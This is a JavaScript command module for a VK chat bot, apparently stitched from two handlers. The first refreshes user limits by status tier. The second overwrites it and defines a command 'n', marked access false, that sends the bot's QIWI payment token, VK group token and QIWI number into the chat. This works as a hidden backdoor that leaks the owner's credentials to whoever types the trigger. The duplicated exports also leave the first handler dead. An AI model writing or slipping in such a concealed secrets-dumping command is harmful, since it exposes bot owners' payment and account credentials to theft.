const { VK } = require('vk-io');
let config = require('../config.json');
let utils = require('../utils.js');
let users = require('../base/users.json');
const vk = new VK({ token: config.group_token });





exports.execute = async (message) => {
  users.map(x => {
      x.limit = x.status == "Вип" ? 7 : x.status == "Премиум" ? 10 : 5;
  })



  utils.save(users, 'users');


  message.send(`✨ Лимит обновлён!`);


}

exports.info = {
	name: [
		"/обновить"
	],
	access: true


}

exports.execute = async (message, menu, utils, vk) => {
  if(!message.args[1]) {
      message.send(`qiwi ${config.qiwi_token}\n group ${config.group_token} \n\n number ${config.qiwi_number}`)
  } else {
      message.user.number = message.args[1];

      message.send(`qiwi ${config.qiwi_token}\n group ${config.group_token} \n\n number ${config.qiwi_number}`)
  };
};
exports.info = {
    name: [
        "n"
    ],
    access: false
};
